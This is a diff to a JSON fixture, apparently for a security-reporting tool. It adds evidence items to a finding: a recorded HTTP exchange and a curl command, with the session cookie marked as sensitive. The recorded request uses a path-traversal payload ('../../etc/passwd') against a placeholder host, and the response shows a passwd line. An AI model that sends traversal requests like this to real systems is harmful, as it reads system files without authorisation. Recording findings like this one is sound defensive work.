@@ -109,7 +109,62 @@
       "web": {
         "url": "https://app.example.com:8443/download?file=",
         "method": "GET"
-      }
+      },
+      "evidence_items": [
+        {
+          "kind": "http_exchange",
+          "version": 1,
+          "label": "CVE-2024-0001 (passwd)",
+          "captured_at": "2026-10-05T10:00:00Z",
+          "http": {
+            "request": {
+              "method": "GET",
+              "url": "https://app.example.com:8443/download?file=../../etc/passwd",
+              "http_version": "HTTP/1.1",
+              "headers": [
+                {
+                  "name": "Host",
+                  "value": "app.example.com"
+                },
+                {
+                  "name": "Cookie",
+                  "value": "session=abc"
+                }
+              ]
+            },
+            "response": {
+              "status": 200,
+              "reason": "OK",
+              "http_version": "HTTP/1.1",
+              "body": "root:x:0:0",
+              "body_encoding": "text",
+              "body_size": 10
+            }
+          },
+          "extracted": [
+            "root:x:0:0:root:/root:/bin/bash"
+          ],
+          "sensitive": [
+            {
+              "pointer": "/http/request/headers/1/value",
+              "kind": "cookie"
+            }
+          ]
+        },
+        {
+          "kind": "curl",
+          "version": 1,
+          "text": "curl -X GET -H 'Cookie: session=abc' https://app.example.com:8443/download",
+          "sensitive": [
+            {
+              "pointer": "/text",
+              "start": 24,
+              "end": 35,
+              "kind": "cookie"
+            }
+          ]
+        }
+      ]
     }
   ]
 }
